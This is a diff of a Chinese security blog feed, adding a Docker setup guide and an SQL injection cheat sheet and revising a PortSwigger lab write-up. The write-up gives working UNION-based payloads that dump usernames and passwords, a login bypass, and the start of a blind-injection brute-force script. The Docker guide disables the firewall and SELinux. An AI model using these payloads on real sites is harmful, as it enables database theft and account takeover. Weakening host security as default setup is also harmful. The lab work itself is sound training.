@@ -356,6 +356,154 @@ $$</p>
       </tags>
   </entry>
   <entry>
+    <title>【linux】docker使用</title>
+    <url>/posts/4c00139f/</url>
+    <content><![CDATA[<h2 id="docker安装">docker安装</h2>
+<ol>
+<li class="lvl-3"><strong>关闭安全程序</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl stop iptables</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> iptable</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">查看selinux是否关闭</span><br><span class="line">getenforce </span><br><span class="line">如果看到是disabled就说明关闭了</span><br><span class="line">如果看到enforcing就证明开着</span><br><span class="line"></span><br><span class="line">修改</span><br><span class="line">sed -i <span class="string">&#x27;7s#enforcing#disabled#g&#x27;</span> /etc/selinux/config</span><br><span class="line">生效</span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li class="lvl-3">
+<p><strong>让时间同步</strong></p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y ntp ntpdate</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line"></span><br><span class="line">执行计划任务</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /usr/sbin/ntpdate  cn.pool.ntp.org &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line">重启计划任务</span><br><span class="line">systemctl restart crond</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li class="lvl-3">
+<p><strong>安装基础依赖程序</strong></p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line">yum install -y device-mapper-persistent-data lvm2 wget net-tools nfs-utils lrzsz gcc gcc-c++ make cmake libxml2-devel openssl-devel curl curl-devel unzip <span class="built_in">sudo</span> ntp libaio-devel wget vim ncurses-devel autoconf automake zlib-devel  python-devel epel-release openssh-server socat  ipvsadm conntrack telnet ipvsadm  yum-utils</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li class="lvl-3">
+<p><strong>安装阿里云docker源</strong></p>
+</li>
+</ol>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">yum-config-manager --<span class="built_in">add</span>-repo http://mirrors.aliyun.<span class="keyword">com</span>/docker-<span class="keyword">ce</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">安装docker：</span><br><span class="line">yum install docker-<span class="keyword">ce</span> -<span class="keyword">y</span></span><br><span class="line"></span><br><span class="line">安装完毕后可以执行</span><br><span class="line">docker <span class="keyword">version</span></span><br><span class="line">查看docker版本</span><br><span class="line"></span><br><span class="line">启动并开机运行docker</span><br><span class="line">systemctl start docker &amp;&amp; systemctl enable docker</span><br><span class="line"></span><br><span class="line">检查docker是否启动成功</span><br><span class="line">systemctl status docker</span><br><span class="line">看到running就是成功了</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li class="lvl-3">
+<p><strong>修改内核参数</strong></p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/sysctl.d/docker.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">修改完查看确认无误</span><br><span class="line"><span class="built_in">cat</span> /etc/sysctl.d/docker.conf</span><br><span class="line"></span><br><span class="line">生效：</span><br><span class="line">sysctl -p /etc/sysctl.d/docker.conf</span><br><span class="line"></span><br><span class="line">确认内核状态</span><br><span class="line">lsmod | grep br_netfilter</span><br><span class="line"></span><br><span class="line">重启后会失效，为了防止此情况</span><br><span class="line">vim /etc/sysconfig/modules/br_netfilter.modules</span><br><span class="line">编写内容：</span><br><span class="line">modprobe br_netfilter</span><br><span class="line">保存退出</span><br><span class="line"></span><br><span class="line">给他执行权限</span><br><span class="line"><span class="built_in">chmod</span> +x /etc/sysconfig/modules/br_netfilter.modules</span><br><span class="line"></span><br><span class="line">创建一个脚本文件：</span><br><span class="line">vim /etc/rc.sysinit</span><br><span class="line">内容：</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> /etc/sysconfig/modules/*.modules</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  [ -x <span class="variable">$file</span> ] &amp;&amp; <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">保存退出</span><br><span class="line">可以通过reboot命令重启服务器查看是否生效</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li class="lvl-3">
+<p>镜像加速器用法</p>
+</li>
+</ol>
+<p>不知道啥情况，我用了国内镜像源也没用，最后用的本机代理。如果有代理的话直接用代理吧。</p>
+<p><strong>国内源：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">添加如下内容：</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>:[<span class="string">&quot;https://a88u1jg4.mirror.aliyuncs.com&quot;</span>,<span class="string">&quot;https://docker.lmirror.top&quot;</span>,<span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,<span class="string">&quot;https://hub.uuuabc.top&quot;</span>,<span class="string">&quot;https://docker.anyhub.us.kg&quot;</span>,<span class="string">&quot;https://dockerhub.jobcher.com&quot;</span>,<span class="string">&quot;https://dockerhub.icu&quot;</span>,<span class="string">&quot;https://docker.ckyl.me&quot;</span>,<span class="string">&quot;https://docker.awsl9527.cn&quot;</span>,<span class="string">&quot;https://docker.laoex.link&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">保存退出</span><br><span class="line">systemctl  daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
+<p><strong>代理：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br><span class="line"></span><br><span class="line">添加内容：</span><br><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br><span class="line">注意改成自己的代理ip和端口，如果没有密码去掉“user:password@”</span><br><span class="line"></span><br><span class="line">刷新配置并重启 docker 服务</span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>
+<h2 id="镜像操作">镜像操作</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">能够连接镜像仓库情况下：</span><br><span class="line">docker search centos  <span class="comment">#找到相关镜像</span></span><br><span class="line">然后：</span><br><span class="line">docker pull centos  <span class="comment">#将镜像直接下载到docker里面</span></span><br><span class="line">docker images  <span class="comment">#查看镜像</span></span><br><span class="line"></span><br><span class="line">现在docker官方镜像仓库不可用，只能使用离线镜像：</span><br><span class="line">如何使用离线镜像：</span><br><span class="line">首先将镜像上传到服务器</span><br><span class="line">rz -be上传镜像文件</span><br><span class="line"></span><br><span class="line">上传完毕后，上载到docker里</span><br><span class="line">容器镜像压缩包不要用tar命令进行解压，要用docker load加载及解压镜像压缩包</span><br><span class="line">docker load -i centos.tar.gz</span><br><span class="line"></span><br><span class="line">查看镜像：</span><br><span class="line">docker images</span><br><span class="line">删除镜像：</span><br><span class="line">docker rmi [镜像名字]或[镜像ID]</span><br></pre></td></tr></table></figure>
+<h2 id="容器操作：">容器操作：</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入一个镜像容器</span><br><span class="line">docker run --name 容器名称（自己取） -it centos(镜像的名称) /bin/bash(调用环境)</span><br><span class="line">退出<span class="built_in">exit</span></span><br><span class="line">此时退出后，容器就会停止运行</span><br><span class="line"></span><br><span class="line">查看所有的容器，包括停止的</span><br><span class="line">docker ps -a </span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker <span class="built_in">rm</span> [镜像名字]或[镜像ID]  <span class="comment">#（名称不能重复）</span></span><br><span class="line">守护形式容器（-d 不会退出就关闭）</span><br><span class="line">docker run --name=xiaoA -td centos /bin/bash</span><br><span class="line"></span><br><span class="line">查看正在运行的容器</span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">进入正在运行的容器</span><br><span class="line">docker <span class="built_in">exec</span> -it xiaoA /bin/bash</span><br><span class="line"></span><br><span class="line">停止容器</span><br><span class="line">docker stop 容器名（容器ID）</span><br><span class="line">开启</span><br><span class="line">docker start 容器名（容器ID）</span><br><span class="line">重启</span><br><span class="line">docker restart 容器名（容器ID）</span><br><span class="line"></span><br><span class="line">查看容器日志</span><br><span class="line">docker logs 容器名（容器ID）</span><br></pre></td></tr></table></figure>
+<h2 id="文件持久化存储">文件持久化存储</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">创建一个目录</span><br><span class="line"><span class="built_in">mkdir</span> ~/xiaoX_data</span><br><span class="line">新建一个容器</span><br><span class="line">docker run --name xiaoC -v ~/xiaoX_data:/data -itd centos /bin/bash</span><br><span class="line">进入容器</span><br><span class="line">docker <span class="built_in">exec</span> -it xiaoC /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /data</span><br><span class="line">创建一些文件</span><br><span class="line"><span class="built_in">echo</span> abc &gt;&gt; 1.txt</span><br><span class="line">通过另一个终端，可以看到文件会出现在/root/xiaoX_data/下面</span><br><span class="line">所以该文件不会丢失</span><br></pre></td></tr></table></figure>
+<h2 id="如何创建自定义容器">如何创建自定义容器</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">先创建一个放dockerfile的文件夹</span><br><span class="line"><span class="built_in">mkdir</span> -p /root/dockerfile/inter-image</span><br><span class="line">进入创建的文件夹</span><br><span class="line"><span class="built_in">cd</span> /root/dockerfile/inter-image </span><br><span class="line">创建dockerfile（必须叫这个名字）</span><br><span class="line"><span class="built_in">touch</span> dockerfile</span><br></pre></td></tr></table></figure>
+<p>老师给的<code>dockerfile</code>内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN sed -i <span class="string">&quot;s|mirrorlist=|#mirrorlist=|g&quot;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&quot;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&quot;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum install wget -y</span><br><span class="line">RUN yum install nginx -y</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>
+<p>但是我一直下载不了<code>centos:latest</code>，所以做了改动：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos:7</span><br><span class="line"><span class="comment"># 修复基础仓库地址</span></span><br><span class="line">RUN sed -i \</span><br><span class="line">    -e <span class="string">&quot;s|mirrorlist=|#mirrorlist=|g&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&quot;</span> \</span><br><span class="line">    /etc/yum.repos.d/CentOS-*</span><br><span class="line"><span class="comment"># 安装 EPEL 仓库（nginx所在仓库）</span></span><br><span class="line">RUN yum install -y epel-release</span><br><span class="line"><span class="comment"># 安装所需软件（合并命令减少层数）</span></span><br><span class="line">RUN yum install -y wget nginx</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /bin/bash  <span class="comment"># 保持前台运行</span></span><br></pre></td></tr></table></figure>
+<p>保存上面内容后退出</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;inter-image&quot;</span> .  <span class="comment">#构建镜像</span></span><br></pre></td></tr></table></figure>
+<p>构建完毕以后该镜像就会生成到docker里</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images  <span class="comment">#查看镜像</span></span><br><span class="line">docker save -o 名字.tar.gz 镜像名字 </span><br><span class="line">docker save -o inter-image.tar.gz inter-image </span><br><span class="line">docker run --name inter-image -v ~/dataxiaoE:/data -itd inter-image  /bin/bash <span class="comment">#构建一个容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it inter-image /bin/bash <span class="comment">#进入容器</span></span><br><span class="line">/usr/sbin/nginx -t  <span class="comment">#开启nginx服务</span></span><br><span class="line">ip a</span><br><span class="line">curl ip:80  <span class="comment">#访问到nginx欢迎页面</span></span><br><span class="line"><span class="built_in">exit</span>  <span class="comment">#退出</span></span><br></pre></td></tr></table></figure>
+<h2 id="容器之间互联">容器之间互联</h2>
+<h3 id="ip互联">ip互联</h3>
+<p>基于上面创建的inter-image镜像分别启动容器test1和test2，并进入到容器中。</p>
+<p>查询ip地址即可互联</p>
+<p><img src="/posts/4c00139f//image-20250710214550350.png" alt="image-20250710214550350"></p>
+<p>开启nginx服务后也可以通过 <code>curl</code> 命令连</p>
+<p><img src="/posts/4c00139f//image-20250710220009917.png" alt="image-20250710220009917"></p>
+<h3 id="网络别名互联">网络别名互联</h3>
+<p>定义网络别名（防止容器ip变化了，导致我们访问不到）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name test3 -td inter-image  <span class="comment">#创建一个测试容器</span></span><br><span class="line">docker run --name test4 -td --<span class="built_in">link</span>=test3:webtest inter-image  <span class="comment">#创建别名容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it test4 /bin/bash  <span class="comment">#进入别名容器</span></span><br><span class="line">ping webtest <span class="comment">#就可以无视test3容器IP变化</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/4c00139f//image-20250710205010145.png" alt="image-20250710205010145"></p>
+<h2 id="docker的网络权限">docker的网络权限</h2>
+<p>host模式：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --name host -it --net=host --privileged=true centos:<span class="number">7</span></span><br><span class="line">ip a  <span class="comment">#发现和本机的IP一样</span></span><br><span class="line"><span class="keyword">exit</span>  <span class="comment">#退出</span></span><br><span class="line">docker rm host  <span class="comment">#删除容器</span></span><br></pre></td></tr></table></figure>
+<p>我的centos太纯净了吧？？？</p>
+<p><img src="/posts/4c00139f//image-20250710210406834.png" alt="image-20250710210406834"></p>
+<p>none模式：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -td --name none --net=none --privileged=true centos:<span class="number">7</span></span><br><span class="line">docker exec -it none <span class="regexp">/bin/</span>bash</span><br><span class="line">ip a  <span class="comment">#发现只有lo网卡</span></span><br><span class="line"><span class="keyword">exit</span>  <span class="comment">#退出</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/4c00139f//image-20250710210105908.png" alt="image-20250710210105908"></p>
+<p>本文参考：</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+  </entry>
+  <entry>
+    <title>【SQL注入】语法示例</title>
+    <url>/posts/180be885/</url>
+    <content><![CDATA[<p>本 SQL 注入小抄包含有用语法的示例，您可以使用这些语法执行各种任务，这些任务在执行 SQL 注入攻击时经常会出现。</p>
+<h2 id="String-concatenation">String concatenation</h2>
+<p>只有一个列时可以将多个字符串连接成一个字符串。</p>
+<table>
+<thead>
+<tr>
+<th>Database type</th>
+<th>Query</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Oracle</td>
+<td>`‘foo’</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>'foo'+'bar'</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>`‘foo’</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>'foo' 'bar'</code> <br><code>CONCAT('foo','bar')</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="Substring">Substring</h2>
+<p>您可以从指定长度的指定偏移量中提取字符串的一部分。请注意，偏移索引是以 1 为单位的。以下每个表达式都将返回字符串 ba。</p>
+<table>
+<thead>
+<tr>
+<th>Database type</th>
+<th>Query</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Oracle</td>
+<td><code>SUBSTR('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="Comments">Comments</h2>
+<p>可以使用注释来截断查询（也可以用别的），并删除原始查询中跟随您输入的部分。</p>
+<p>本文参考：</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【PortSwigger靶场】反序列化</title>
     <url>/posts/bea7d250/</url>
     <content><![CDATA[<h2 id="不安全的反序列化">不安全的反序列化</h2>
@@ -1774,9 +1922,9 @@ AddType application/x-httpd-php .php</p>
       </tags>
   </entry>
   <entry>
-    <title>【PortSwigger学院】SQL injection</title>
+    <title>【PortSwigger学院】SQL 注入</title>
     <url>/posts/3b7c6011/</url>
-    <content><![CDATA[<h2 id="SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+    <content><![CDATA[<h2 id="SQL注入漏洞语句允许检索隐藏数据的位置">SQL注入漏洞语句允许检索隐藏数据的位置</h2>
 <p>这个是查看隐藏数据的漏洞，比较简单。通过BurpSuite直接拦截修改就行。</p>
 <p><img src="/posts/3b7c6011//image-20250305143611182.png" alt="image-20250305143611182"></p>
 <p>之所以能隐藏信息是因为后端的查询语句是</p>
@@ -1785,12 +1933,12 @@ AddType application/x-httpd-php .php</p>
 <p><strong>思考</strong>：</p>
 <p>首先对后端查询语句要有一定敏感程度，另外如果AND后的语句在前是否就避免了这个漏洞呢？</p>
 <span id="more"></span>
-<h2 id="SQL-injection-vulnerability-allowing-login-bypass">SQL injection vulnerability allowing login bypass</h2>
+<h2 id="SQL注入漏洞允许登录绕过">SQL注入漏洞允许登录绕过</h2>
 <p>这个也非常简单，注释掉password就可以登录任意用户了。</p>
 <p><img src="/posts/3b7c6011//image-20250305144942049.png" alt="image-20250305144942049"></p>
 <p><strong>思考</strong>：</p>
 <p>对之前挖的几个平台做了一下尝试，没出意外都失败了。果然这么简单的洞不太好遇见。</p>
-<h2 id="SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query">SQL injection UNION attack, determining the number of columns returned by the query</h2>
+<h2 id="SQL注入UNION攻击，确定查询返回的列数">SQL注入UNION攻击，确定查询返回的列数</h2>
 <p>这个使用<code>?category=Accessones' order by 3--</code>时不报错，使用<code>?category=Accessones' order by 4--</code>时报错，说明返回列有三个。但是不能直接过关，需要使用<code>'?category=Accessones'UNION SELECT NULL,NULL,NULL--</code>过关</p>
 <p><img src="/posts/3b7c6011//image-20250305153505747.png" alt="image-20250305153505747"></p>
 <p>我们可以看到，虽然执行<code>order by 4</code>的时候报错，但是报错代码为500说明还是执行了的。在portswigger中提到：</p>
@@ -1802,16 +1950,15 @@ AddType application/x-httpd-php .php</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure>
 <p>MySQL 中，<code>--</code>后必须跟一个空格。</p>
 <p>有关数据库特定语法的更多详情，请参阅 <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
-<h2 id="SQL-injection-UNION-attack-finding-a-column-containing-text">SQL injection UNION attack, finding a column containing text</h2>
+<h2 id="SQL注入UNION攻击，找到包含文本的列">SQL注入UNION攻击，找到包含文本的列</h2>
 <p>让找哪个列支持查找字符串，找出一共多少列以后，挨个试试就可以了</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abcdef<span class="string">&#x27;,NULL,NULL--</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">?category=Accessories%&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;Y5LIpq&#x27;</span>,<span class="keyword">null</span><span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; and 1=2 union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br></pre></td></tr></table></figure>
-<h2 id="SQL-injection-UNION-attack-retrieving-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables</h2>
+<h2 id="SQL初入UNION攻击，从其他表中检索数据">SQL初入UNION攻击，从其他表中检索数据</h2>
 <p>让检索出管理员账号密码，然后登陆管理员的账号。这道题的重点是当遇到两个能检索出字符串的列时，如何利用。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure>
-<h2 id="SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column">SQL injection UNION attack, retrieving multiple values in a single column</h2>
+<h2 id="SQL注入UNION攻击，在单列中检索多个值">SQL注入UNION攻击，在单列中检索多个值</h2>
 <p>当只有一个string列可以被检索时，需要将两个列的内容连接到一个列。</p>
-<p>这一题稍微有了一点点难度：</p>
 <ol>
 <li class="lvl-3">
 <p>首先通过之前的办法看看有几个可以检索的列</p>
@@ -1826,28 +1973,37 @@ AddType application/x-httpd-php .php</p>
 <p>通过检测，可以检索的列有两个，第二个可以检索字符串。将用户名和密码合并到第二列中即可，注入代码：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,username||&#x27;</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="string">&#x27;||password+from+users--</span></span><br></pre></td></tr></table></figure>
 <p>不同的数据库使用不同的语法来执行字符串连接。有关详细信息，请参阅<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
+<p>| Oracle     | <code>                   'foo'||'bar'               </code> |<br>
+| ---------- | -------------------------------------------------- |<br>
+| Microsoft  | <code>                   'foo'+'bar'               </code>  |<br>
+| PostgreSQL | <code>                   'foo'||'bar'               </code> |<br>
+| MySQL      | CONCAT(‘foo’,‘bar’)                                |</p>
 <p>然而在实际情况下，我们并不能像题目所给出的那样直接获得表名和列名。因此，现实中，我们需要首先获得数据库的表名和列名，才能对其进行查询。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,table_name from information_schema.tables--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列：username,password</span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">数据:administrator<span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>lcv555mv2prf2m81w40v</span><br><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,concat(username,&#x27;</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用administrator登录</span></span><br></pre></td></tr></table></figure>
-<h2 id="SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft">SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+<h2 id="SQL-注入攻击，查询-MySQL-和-Microsoft-的数据库类型和版本">SQL 注入攻击，查询 MySQL 和 Microsoft 的数据库类型和版本</h2>
 <p>获得数据库的版本号，比较简单。各个数据库查询数据库版本的语句如下：</p>
 <table>
 <thead>
 <tr>
-<th>Database type</th>
+<th style="text-align:left">Database type</th>
 <th>Query</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Microsoft, MySQL</td>
+<td style="text-align:left">MySQL</td>
 <td><code>SELECT @@version</code></td>
 </tr>
 <tr>
-<td>Oracle</td>
-<td><code>SELECT * FROM v$version</code></td>
+<td style="text-align:left">Microsoft</td>
+<td><code>SELECT @@version</code></td>
 </tr>
 <tr>
-<td>PostgreSQL</td>
+<td style="text-align:left">Oracle</td>
+<td><code>SELECT * FROM v$version</code><br><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td>
+</tr>
+<tr>
+<td style="text-align:left">PostgreSQL</td>
 <td><code>SELECT version()</code></td>
 </tr>
 </tbody>
@@ -1856,11 +2012,10 @@ AddType application/x-httpd-php .php</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,@@version-- +</span></span><br></pre></td></tr></table></figure>
 <p>思考：</p>
 <p>发现了一个问题，在执行SQL注入时，使用<code>--</code>进行注释时需要在其后添加一个空格，即<code>-- +</code>。然而刚开始并没有加但是还是过了，因此需要注意。另外这一题是可以使用<code>#</code>来注释的，但是前面的却不行，原因目前还不明白。</p>
-<h2 id="SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases">SQL injection attack, listing the database contents on non-Oracle databases</h2>
+<h2 id="SQL-注入攻击，列出非-Oracle-数据库的数据库内容">SQL 注入攻击，列出非 Oracle 数据库的数据库内容</h2>
 <p>这一题题目没有给表单和列名，更切合实际情况，实际上跟上面的是一致的。不再过多叙述。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union select &#x27;</span>a<span class="string">&#x27;,null-- =</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables<span class="comment">-- =</span></span><br><span class="line"><span class="string">&#x27;union select column_name,null from information_schema.columns where table_name=&#x27;</span>users_vorbge<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> username_ucmiyr<span class="operator">||</span><span class="string">&#x27;~~~&#x27;</span><span class="operator">||</span>password_unmsjv,<span class="keyword">null</span> <span class="keyword">from</span> users_vorbge<span class="comment">-- =</span></span><br></pre></td></tr></table></figure>
-<h2 id="Blind-SQL-injection-with-conditional-responses">Blind SQL injection with conditional responses</h2>
-<p>这道题吧，我个人感觉算是一道很不错的题了，对目前的我来讲已经算是很有难度了。但是同时，我也发现如果我不能缜密的去思考现实情况里会遇到的问题，靶场给我带来的收获也是有限的。因此我也决定打完SQL注入的靶场以后，先找一些SQL注入漏洞的案例复现一下，感受一下真是的场景。</p>
+<h2 id="利用条件响应进行盲目-SQL-注入">利用条件响应进行盲目 SQL 注入</h2>
 <p>在开始这道题之前呢，有必要了解一下，要解决这道题是有三个必要条件的：</p>
 <ol>
 <li class="lvl-3">
@@ -1887,31 +2042,57 @@ AddType application/x-httpd-php .php</p>
 <p>在获得某用户密码的时候，本题只需要我们获得<code>administrator</code>的密码就可以了，考虑到密码又多又长，逐个爆破会消耗大量的时间，因此我编写了Python脚本单独对<code>administrator</code>用户进行爆破，脚本已经很自动化了，只需要把url和TrackingId换成子自己的就可以了。脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求的URL</span></span><br><span class="line">url = <span class="string">&quot;https://0a00000a04a6557481de208a005400a1.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">username = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">tablename = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">sleep_time = <span class="number">0</span></span><br><span class="line">TrackingId = <span class="string">&#x27;brVO8ubeFsIHT9hw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie获取密码长度get_password_length_by_user</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_length_by_user</span>(<span class="params">url,username,tablename,intject_id</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;intject_id&#125;</span>&#x27; and (select &#x27;a&#x27; from users where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND 